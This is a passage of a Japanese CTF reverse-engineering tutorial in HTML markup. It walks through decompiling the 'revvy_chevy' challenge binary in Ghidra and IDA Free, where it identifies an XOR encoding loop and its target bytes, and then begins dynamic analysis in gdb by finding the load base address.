&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; cVar1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;lVar5&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    lVar5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; lVar5 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lVar5 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここからは、この関数の処理を追っていきます。&lt;/p&gt;
&lt;p&gt;Ghidraのデコンパイル結果を見てみると、たった一行だけのシンプルな関数でした。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;FUN_001011e9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  DAT_0010402c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_0010402c &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x41c64e6d&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3039&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DAT_0010402c&lt;/code&gt;は未定義の変数でしたので、&lt;code class=&quot;language-text&quot;&gt;valiable&lt;/code&gt;などの適当な名前に置き換えておきます。&lt;/p&gt;
&lt;p&gt;さて、ここで一つ疑問が出てきました。&lt;/p&gt;
&lt;p&gt;呼び出し元の&lt;code class=&quot;language-text&quot;&gt;cVar1 = FUN_001011e9();&lt;/code&gt;というデコンパイル結果を見ると、この関数の戻り値が&lt;code class=&quot;language-text&quot;&gt;cVar1&lt;/code&gt;に格納されるように見えます。&lt;/p&gt;
&lt;p&gt;しかし、実際にこの関数のデコンパイル結果を見てみると戻り値のない&lt;code class=&quot;language-text&quot;&gt;void&lt;/code&gt;関数になっています。&lt;/p&gt;
&lt;p&gt;これはどちらが正しいのでしょうか。&lt;/p&gt;
&lt;p&gt;アセンブリを読んだり動的解析で特定しても良いですが、今回はIDA Freeによるデコンパイル結果も見てみようと思います。&lt;/p&gt;
&lt;h3 id=&quot;ida-freeを使う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ida-free%E3%82%92%E4%BD%BF%E3%81%86&quot; aria-label=&quot;ida freeを使う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IDA Freeを使う&lt;/h3&gt;
&lt;p&gt;せっかく事前にインストールをお願いしているので、IDA Freeの解析結果も見てみましょう。&lt;/p&gt;
&lt;p&gt;IDAに関する詳細な説明は割愛しますので、以下のコマンドで起動し、問題バイナリをインポートしてください。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ida64&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ghidraで解析したときとは異なり、初めからmain関数のシンボルを特定してくれていますね。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/68f905ac0b6132edf6784dd5638f4d55/0b533/image-43.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 57.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAACW0lEQVQoz11SSXKcQBDk/3c/wZJ10QPsgw8+edPIsmTPxqzsS9M0DTTNkk5G0kEmIqOAqsjKqixn7W5xv3Gx2blYr56wXC+xdTd4XD7i9leEq4cQ7x72uP29xXr9BdvdHU5egDA64/7bAu+vrnB9c4MPxPXNBzhFVKBRHbrKohE1SqnRdh1a0wBEX2vYuoA1NbQZoZsGx3iHw1lA6ArzMxGd7S/R8X6eMPkDpmAE/AmDGmGZ6pk1c+ELLL8HxrozWG0W8IIYumXz1qC3FlJK5jo4yhOY5ICx6AGilg30MKAdJzTj+AbtNKFsLcKw5opSRJkkocXI+rKqoKnS6fD2UaaD7Cw0BVfD9AY1VQoS+L7E4zrE2vfQ9c8MSmuUM2Hz/SPM4jNawv74BOH+geBsZT9CEq9R2hGKpFlDhUGFxWaFu/MDamMuhBV3KzoS9lGEIUkvmJIEBWNiBwguMSfRDEGiYlZH1REJj8ccy02MmCNXVXcZuVAKibFwjoszDE1ByjYJ15i2CNkppQsJVaUkDuoOqyBHolukUiGIMuxPMc6phE8ir1Q40pSgpSkpO43ZgCGl7UkPXVoEJAq7iRgR0asDjdrvU2w3AmlSQtVUIwX8l/yMkAK8WWEucmjeWsWlat5Vqip4JHuFT5zbEaswx9e/LnZxBk8UOBTq8v9SZ1hjBhxpmKM46dYPcBICinuKTI99M+DQPmN+P9HIJzE76yHLKyRlhd1cw0Ofa45zJOGO+3WSxsDlkZ5ziYQ7iJVGXMj/UCDMcqSZuCBj85gq51zC3eW8QcEJ80rjH5CFjbBayOzRAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/68f905ac0b6132edf6784dd5638f4d55/8ac56/image-43.webp 240w,
/static/68f905ac0b6132edf6784dd5638f4d55/d3be9/image-43.webp 480w,
/static/68f905ac0b6132edf6784dd5638f4d55/b0a15/image-43.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/68f905ac0b6132edf6784dd5638f4d55/8ff5a/image-43.png 240w,
/static/68f905ac0b6132edf6784dd5638f4d55/e85cb/image-43.png 480w,
/static/68f905ac0b6132edf6784dd5638f4d55/0b533/image-43.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/68f905ac0b6132edf6784dd5638f4d55/0b533/image-43.png&quot;
            alt=&quot;2021/12/image-43.png&quot;
            title=&quot;2021/12/image-43.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;IDAでは、逆アセンブル結果が出力されている画面で[F5]キーを押すとデコンパイルを行ってくれます。&lt;/p&gt;
&lt;p&gt;Ghidraの時と同じ行からXOR暗号化時に実行されている関数を特定してデコンパイル結果を確認すると、以下のようにint64型の戻り値を返すことがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/0b533/image-44.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 32.49999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAARlAAAEZQAGA43XUAAABFUlEQVQoz6WQTW6DMBCFOXpv0HO09+ii3aWKsiAEsJ2Af8HQAOYnvE6pqkpdpiM9eeZJ82meI+UUGI+RpCcUUsJVDvlFgikPoxWEOG+yrsIgEsSZhnQNuOC0k+JSFqh8DV5KxGeHiIsnpNkDcvZC4IJ6hkuh4L2HI4h1DtY6VFUNT73WFsZaKEVgqaC03mZtDMkialuGaXrEEJ7R9x/oug7jCISAuyqqfYcsv1GECZx3OCYGu/cSx6NBlgUcDgv2+xsYC0hOFWLyufDY7Uq8vgnkeU0HLBtsXVdEUje01FDUHmW5oq4DxR0oYk/XjmjbG3nrphAWer/963Wkr+hgzJWA8y9wuDfbn/qCbZHnZd6G/+oH+glXMxfaQoF2fgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/8ac56/image-44.webp 240w,
/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/d3be9/image-44.webp 480w,
/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/b0a15/image-44.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/8ff5a/image-44.png 240w,
/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/e85cb/image-44.png 480w,
/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/0b533/image-44.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/cdd4bfe4f7829d4cc5c5b5f7fb8885ba/0b533/image-44.png&quot;
            alt=&quot;2021/12/image-44.png&quot;
            title=&quot;2021/12/image-44.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このように、デコンパイルの結果はデコンパイラによって異なっていたり、そもそも間違った結果が出る場合もあります。&lt;/p&gt;
&lt;p&gt;そのため、デコンパイラを妄信せず困ったときにはアセンブリを丁寧に読んだり他のツールの結果と見比べてみたりするのがおすすめです。&lt;/p&gt;
&lt;h3 id=&quot;xor暗号化の挙動を見抜く&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#xor%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%AE%E6%8C%99%E5%8B%95%E3%82%92%E8%A6%8B%E6%8A%9C%E3%81%8F&quot; aria-label=&quot;xor暗号化の挙動を見抜く permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;XOR暗号化の挙動を見抜く&lt;/h3&gt;
&lt;p&gt;さて、これでこの戻り値&lt;code class=&quot;language-text&quot;&gt;cVar1&lt;/code&gt;にループカウンタ&lt;code class=&quot;language-text&quot;&gt;lVar5&lt;/code&gt;を加算した値を利用して&lt;code class=&quot;language-text&quot;&gt;input_text&lt;/code&gt;を先頭から1文字ずつXOR暗号化を行っていることがわかりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; cVar1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;lVar5&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最終的にこの暗号化結果が以下のバイト列になる入力を見つけることができればFlagが取得できそうです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; 0x74, 0x1a, 0x95, 0x4e, 0xba, 0xdb, 0x47, 0x64, 0x09, 0x2d, 0xd1, 0xbf, 0x8a, 0x9d, 0xde, 0x5a, 0xd7, 0x5c, 0x93, 0x16, 0x09, 0x3b, 0x30, 0x6f, 0x97, 0x40, 0xd0, 0x7c, 0x57, 0xdb, 0xde, 0x0c, 0x09, 0xa0, 0x84, 0x9b, 0x8a, 0x76, 0x2f, 0xb1, 0x57, 0xa2, 0xe1, 0x4f, 0xb9, 0x6f, 0x81, 0xbf, 0xb9, 0xbf, 0xe1, 0xef, 0x79, 0xcf, 0x01, 0xdf, 0xf9, 0x9f, 0xe1, 0x8f, 0x39, 0x2f, 0x81, 0xff, 0x00 &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このまま静的解析でFlagを特定することもできますが、結構面倒なのでここからは動的解析を行っていきます。&lt;/p&gt;
&lt;p&gt;動的解析とは、実際に実行ファイルを動かしながら解析を行う方法です。&lt;/p&gt;
&lt;p&gt;今回はgdbというデバッガを使って動的解析を行い、Flagを特定していきたいと思います。&lt;/p&gt;
&lt;h2 id=&quot;gdbで動的解析を行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdb%E3%81%A7%E5%8B%95%E7%9A%84%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;gdbで動的解析を行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;gdbで動的解析を行う&lt;/h2&gt;
&lt;p&gt;まずはgdbで問題バイナリを開いてみましょう。&lt;/p&gt;
&lt;p&gt;すでにgdb-pedaを導入している場合は、色付けされたコンソールが開きます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ gdb ./revvy_chevy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;gdb-pedaの詳細は割愛しますが、gdbのレジスタやメモリ情報などを綺麗に可視化してくれる拡張機能のようなものだと思ってください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/longld/peda&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;longld/peda: PEDA - Python Exploit Development Assistance for GDB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gdbでCTFの問題を解く際の基本的な操作は次のようになります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;怪しい箇所や動きを把握したい箇所にブレークポイントを設定する&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ブレークポイントで処理を停止して、メモリやレジスタの情報を参照する&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flagを取得するために、実行中のプログラムのメモリやレジスタのデータを改ざんして、本来は実行されない処理を呼び出す&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;gdbのロードアドレスを特定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdb%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;gdbのロードアドレスを特定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;gdbのロードアドレスを特定する&lt;/h3&gt;
&lt;p&gt;まずはmain関数にブレークポイントを設定してみます。&lt;/p&gt;
&lt;p&gt;gdbでは、以下のいずれかのコマンドでブレークポイントの設定が可能です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;b &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;ブレークポイント対象&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
&lt;span class=&quot;token builtin class-name&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;ブレークポイント対象&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ブレークポイント対象には、関数名や現在のファイルの行番号、停止時点からのオフセット、メモリアドレスなどを指定することができます。&lt;/p&gt;
&lt;p&gt;今回の問題のように、CTFの場合はシンボル情報が与えられていない場合が多いので、基本的にはメモリアドレスでのブレークポイントの設定が主になるかと思います。&lt;/p&gt;
&lt;p&gt;先ほどGhidraでmain関数を特定したときは、main関数のアドレスは&lt;code class=&quot;language-text&quot;&gt;0x1208&lt;/code&gt;でしたね。&lt;/p&gt;
&lt;p&gt;しかし、このアドレスをgdbで指定しても、main関数にブレークポイントを設定することはできません。&lt;/p&gt;
&lt;p&gt;gdbでブレークポイントを設定するときは、gdbがプログラムを実行したときに読み込むRVAを指定 してあげる必要があります。&lt;/p&gt;
&lt;p&gt;main関数のアドレスは&lt;code class=&quot;language-text&quot;&gt;0x1208&lt;/code&gt;は仮想アドレス(VA)ですので、RVAを特定するためにgdbが実行されたときにメモリを展開するベースアドレスを特定していきます。&lt;/p&gt;
&lt;p&gt;ベースアドレスを特定するために、とりあえず問題バイナリをgdbから実行してみます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;コマンドで実行すると、先ほど同様標準入力を求められます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ run
Starting program: /home/parrot/Downloads/revvy_chevy 
What&apos;s the flag? &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで[Ctrl+C]を押してプログラムの処理を中断しましょう。&lt;/p&gt;
&lt;p&gt;[Ctrl+C]キーを押すことでキーボード割込みSIGINTが発生して、プログラムの実行を中断し、gdbを操作できるようになります。&lt;/p&gt;
&lt;p&gt;この状態で&lt;code class=&quot;language-text&quot;&gt;info proc mappings&lt;/code&gt;コマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ info proc mappings 
process &lt;span class=&quot;token number&quot;&gt;1971&lt;/span&gt;
Mapped address spaces:
          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/parrot/Downloads/revvy_chevy
      0x555555555000     0x555555556000     0x1000     0x1000 /home/parrot/Downloads/revvy_chevy
      0x555555556000     0x555555557000     0x1000     0x2000 /home/parrot/Downloads/revvy_chevy
      0x555555557000     0x555555558000     0x1000     0x2000 /home/parrot/Downloads/revvy_chevy
      0x555555558000     0x555555559000     0x1000     0x3000 /home/parrot/Downloads/revvy_chevy
  	  /* 省略 */&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;すると、問題バイナリのオフセットと、gdbがロードするメモリアドレスのマッピング情報が確認できます。&lt;/p&gt;
&lt;p&gt;ファイルオフセット&lt;code class=&quot;language-text&quot;&gt;0x1000&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;0x555555555000&lt;/code&gt;にマッピングされているようです。&lt;/p&gt;
&lt;p&gt;readelfやradare2で表層解析を行った結果から&lt;code class=&quot;language-text&quot;&gt;.text&lt;/code&gt;セクションのアドレスは&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;であることがわかっているため、&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;がgdb実行時の&lt;code class=&quot;language-text&quot;&gt;0x555555555100&lt;/code&gt;に対応します。&lt;/p&gt;
&lt;p&gt;少しわかりづらいかもしれませんが、アドレス&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;がgdb実行時の&lt;code class=&quot;language-text&quot;&gt;0x555555555100&lt;/code&gt;にロードされるということは、main関数のアドレス&lt;code class=&quot;language-text&quot;&gt;0x1208&lt;/code&gt;はgdb上の&lt;code class=&quot;language-text&quot;&gt;0x555555555208&lt;/code&gt;にロードされるというわけです。&lt;/p&gt;
&lt;h3 id=&quot;ブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;ブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ブレークポイントを設定する&lt;/h3&gt;
